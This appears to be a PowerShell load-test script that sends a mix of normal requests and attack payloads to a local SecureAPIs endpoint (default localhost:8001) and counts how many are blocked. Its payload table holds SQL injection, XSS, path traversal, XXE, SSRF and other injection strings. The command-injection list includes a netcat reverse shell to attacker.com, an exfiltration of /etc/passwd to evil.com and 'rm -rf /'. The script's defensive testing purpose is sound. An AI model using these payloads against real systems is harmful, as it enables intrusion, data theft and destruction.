<#
.SYNOPSIS
  Advanced load/test script for SecureAPIs (for authorized security testing only).
#>

param(
    [int]$TotalRequests = 100000,
    [int]$ParallelJobs = 10,
    [string]$TargetUrl = "http://localhost:8001",
    [switch]$Verbose
)

if ($TotalRequests -le 0) { throw "TotalRequests must be > 0" }
if ($ParallelJobs -le 0) { throw "ParallelJobs must be > 0" }
if ($ParallelJobs -gt $TotalRequests) { $ParallelJobs = [math]::Min($ParallelJobs, $TotalRequests) }

if ($TargetUrl.EndsWith('/')) { $TargetUrl = $TargetUrl.TrimEnd('/') }

Write-Host 'WARNING: Run this only against systems you own or are authorized to test.' -ForegroundColor Yellow

$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'

$stats = @{
    Total = 0
    Success = 0
    Blocked = 0
    RateLimited = 0
    Failed = 0
    StartTime = Get-Date
}

$maliciousPayloads = @{
    SqlInjection = @(
        "' OR '1'='1",
        "admin'--",
        "1' UNION SELECT NULL, username, password FROM users--",
        "'; DROP TABLE users; --",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "' OR 'x'='x",
        "1; EXEC sp_MSForEachTable 'DROP TABLE ?'",
        "' UNION SELECT NULL, NULL, NULL--",
        "admin' OR '1'='1' /*",
        "' WAITFOR DELAY '00:00:05'--",
        "1' ORDER BY 10--",
        "' UNION ALL SELECT NULL, table_name FROM information_schema.tables--"
    )
    XSS = @(
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<svg/onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src=x:alert(1) onerror=eval(src)>',
        '<svg><script>alert(1)</script></svg>'
    )
    PathTraversal = @(
        '../../../etc/passwd',
        '..\..\windows\system32\drivers\etc\hosts',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%252F..%252F..%252Fetc%252Fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..;/..;/..;/etc/passwd',
        '../../../../../../../../../../../etc/passwd'
    )
    CommandInjection = @(
        '; rm -rf /',
        '`cat /etc/passwd`',
        '$(whoami)',
        '| ls -la',
        '& dir',
        '; cat /etc/shadow',
        '`id`',
        '$(curl http://evil.com)',
        '; nc -e /bin/sh attacker.com 4444',
        '| wget http://evil.com/malware',
        '`curl -X POST -d @/etc/passwd http://evil.com`'
    )
    LDAPInjection = @(
        '*)(uid=*',
        'admin)(|(password=*))',
        '*)(objectClass=*',
        '*)(&(objectClass=user',
        '*))(|(cn=*'
    )
    XXE = @(
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><data>&xxe;</data>'
    )
    SSRF = @(
        'http://localhost:22',
        'http://127.0.0.1:6379',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'gopher://localhost:25/MAIL%20FROM:attacker',
        'http://[::1]:80'
    )
    NoSQLInjection = @(
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '[$ne]=1'
    )
    TemplateInjection = @(
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{config.items()}}',
        '{{request.application.__globals__}}'
    )
}

$attackPatterns = @(
    @{Name='SQLi'; Payloads=$maliciousPayloads.SqlInjection; Weight=20},
    @{Name='XSS'; Payloads=$maliciousPayloads.XSS; Weight=20},
    @{Name='PathTraversal'; Payloads=$maliciousPayloads.PathTraversal; Weight=15},
    @{Name='CmdInjection'; Payloads=$maliciousPayloads.CommandInjection; Weight=15},
    @{Name='LDAP'; Payloads=$maliciousPayloads.LDAPInjection; Weight=10},
    @{Name='XXE'; Payloads=$maliciousPayloads.XXE; Weight=5},
    @{Name='SSRF'; Payloads=$maliciousPayloads.SSRF; Weight=10},
    @{Name='NoSQL'; Payloads=$maliciousPayloads.NoSQLInjection; Weight=5},
    @{Name='Template'; Payloads=$maliciousPayloads.TemplateInjection; Weight=5}
)

$normalPaths = @(
    '/api/ui/dashboard',
    '/api/ui/metrics',
    '/api/ui/alerts',
    '/api/ui/requests',
    '/api/ui/health',
    '/api/ui/blocked-ips',
    '/health',
    '/test'
)

function Write-Progress-Bar {
    param($Current, $Total)
    if ($Total -le 0) { return }
    $percent = [math]::Round(($Current / $Total) * 100, 1)
    $barLength = 50
    $filled = [math]::Round($barLength * $percent / 100)
    $bar = '[' + ('=' * $filled) + (' ' * ($barLength - $filled)) + ']'
    Write-Host "`r$bar $percent% ($Current/$Total)" -NoNewline -ForegroundColor Cyan
}

$batchSize = [math]::Ceiling($TotalRequests / [double]$ParallelJobs)

$jobs = @()
for ($jobId = 0; $jobId -lt $ParallelJobs; $jobId++) {
    $start = $jobId * $batchSize
    $end = [math]::Min(($jobId + 1) * $batchSize, $TotalRequests)
    if ($start -ge $end) { continue }

    $jobs += Start-Job -ScriptBlock {
        param($Start, $End, $TargetUrl, $NormalPaths, $AttackPatterns, $Verbose)

        [System.Random]$rnd = New-Object System.Random([int]((Get-Date).Ticks % 2147483647))

        function Get-RandomAttack {
            $totalWeight = 0
            foreach ($p in $AttackPatterns) { $totalWeight += [int]$p.Weight }
            $r = $rnd.Next(0, $totalWeight)
            $cumulative = 0
            foreach ($p in $AttackPatterns) {
                $cumulative += [int]$p.Weight
                if ($r -lt $cumulative) {
                    $payload = $p.Payloads[$rnd.Next(0, $p.Payloads.Count)]
                    return @{Type=$p.Name; Payload=$payload}
                }
            }
            return @{Type='SQLi'; Payload="' OR '1'='1"}
        }

        $results = @{Success=0; Blocked=0; RateLimited=0; Failed=0; Total=0}

        for ($i = $Start; $i -lt $End; $i++) {
            $isAttack = ($rnd.Next(0,100) -lt 70)

            if ($isAttack) {
                $attack = Get-RandomAttack
                $encoded = [uri]::EscapeDataString($attack.Payload)
                $path = "/api/test/secure?input=$encoded&type=$($attack.Type)&id=$i"
                $uri = "$TargetUrl$path"
            } else {
                $path = $NormalPaths[$rnd.Next(0, $NormalPaths.Count)]
                $uri = $TargetUrl + $path
            }

            try {
                $response = Invoke-WebRequest -Uri $uri -TimeoutSec 5 -ErrorAction Stop
                $status = 0
                if ($response -and $response.StatusCode) { $status = [int]$response.StatusCode }

                if ($status -ge 200 -and $status -lt 400) {
                    $results.Success++
                } elseif ($status -eq 429) {
                    $results.RateLimited++
                } elseif ($status -ge 400 -and $status -lt 500) {
                    $results.Blocked++
                } else {
                    $results.Failed++
                }
            }
            catch {
                $statusCode = 0
                try {
                    if ($_.Exception.Response -and $_.Exception.Response.StatusCode) {
                        $statusCode = [int]$_.Exception.Response.StatusCode
                    }
                } catch { $statusCode = 0 }

                if ($statusCode -eq 429) { $results.RateLimited++ }
                elseif ($statusCode -ge 400 -and $statusCode -lt 500) { $results.Blocked++ }
                else { $results.Failed++ }

                if ($Verbose) {
                    Write-Host ("Job {0} request {1} failed with status {2} - {3}" -f $env:JOB_ID, $i, $statusCode, $_.Exception.Message)
                }
            }
            $results.Total++
            Start-Sleep -Milliseconds 5
        }

        return $results
    } -ArgumentList $start, $end, $TargetUrl, $normalPaths, $attackPatterns, $Verbose
}

Write-Host ''
Write-Host '===============================================================' -ForegroundColor Cyan
Write-Host '=                    LOAD TEST RUNNING                       =' -ForegroundColor Cyan
Write-Host '===============================================================' -ForegroundColor Cyan
Write-Host "Target URL: $TargetUrl" -ForegroundColor Yellow
Write-Host "Total Requests: $TotalRequests" -ForegroundColor Yellow
Write-Host "Parallel Jobs: $ParallelJobs" -ForegroundColor Yellow
Write-Host "Attack Ratio: 70% malicious, 30% legitimate`n" -ForegroundColor Yellow

$completedRequests = 0
while ($true) {
    $running = $jobs | Where-Object { $_.State -eq 'Running' }
    $completedJobs = $jobs | Where-Object { $_.State -eq 'Completed' }

    $completedRequests = 0
    foreach ($j in $completedJobs) {
        $jobId = $jobs.IndexOf($j)
        $startApprox = $jobId * $batchSize
        $endApprox = [math]::Min(($jobId + 1) * $batchSize, $TotalRequests)
        $completedRequests += ($endApprox - $startApprox)
    }

    Write-Progress-Bar -Current $completedRequests -Total $TotalRequests

    if (-not $running) { break }
    Start-Sleep -Milliseconds 500
}

Write-Host "`n`nCollecting results..." -ForegroundColor Green

foreach ($job in $jobs) {
    try {
        $result = Receive-Job -Job $job -Wait -AutoRemoveJob
        if ($result) {
            $stats.Success += ($result.Success -as [int])
            $stats.Blocked += ($result.Blocked -as [int])
            $stats.RateLimited += ($result.RateLimited -as [int])
            $stats.Failed += ($result.Failed -as [int])
            $stats.Total += ($result.Total -as [int])
        }
    } catch {
        Write-Warning "Failed to receive job output: $($_.Exception.Message)"
    }
}

if ($stats.Total -eq 0) { $stats.Total = $stats.Success + $stats.Blocked + $stats.RateLimited + $stats.Failed }

$duration = (Get-Date) - $stats.StartTime

Write-Host ''
Write-Host '===============================================================' -ForegroundColor Cyan
Write-Host '=                    LOAD TEST RESULTS                      =' -ForegroundColor Cyan
Write-Host '===============================================================' -ForegroundColor Cyan
Write-Host "Total Requests:       $($stats.Total)" -ForegroundColor Cyan
Write-Host "Successful:           $($stats.Success)" -ForegroundColor Green
Write-Host "Blocked:              $($stats.Blocked)" -ForegroundColor Yellow
Write-Host "Rate Limited:         $($stats.RateLimited)" -ForegroundColor Magenta
Write-Host "Failed:               $($stats.Failed)" -ForegroundColor Red

if ($stats.Total -gt 0) {
    $blockRate = [math]::Round(($stats.Blocked / $stats.Total) * 100, 2)
    $color = if ($blockRate -gt 50) { "Red" } elseif ($blockRate -gt 20) { "Yellow" } else { "Green" }
    Write-Host ("`nBlock Rate:           {0}%" -f $blockRate) -ForegroundColor $color
}

if ($duration.TotalSeconds -gt 0) {
    $rps = [math]::Round($stats.Total / $duration.TotalSeconds, 2)
    Write-Host ("Requests/Second:      {0}" -f $rps) -ForegroundColor Cyan
}

Write-Host ("Duration:             {0} seconds" -f [math]::Round($duration.TotalSeconds, 2)) -ForegroundColor Cyan

Write-Host ''
Write-Host '===============================================================' -ForegroundColor Cyan
Write-Host "=  Check Dashboard: http://localhost:5174                   =" -ForegroundColor Cyan
Write-Host ("=  Blocked IPs API: {0}/api/ui/blocked-ips           =" -f $TargetUrl) -ForegroundColor Cyan
Write-Host '===============================================================' -ForegroundColor Cyan
Write-Host ''
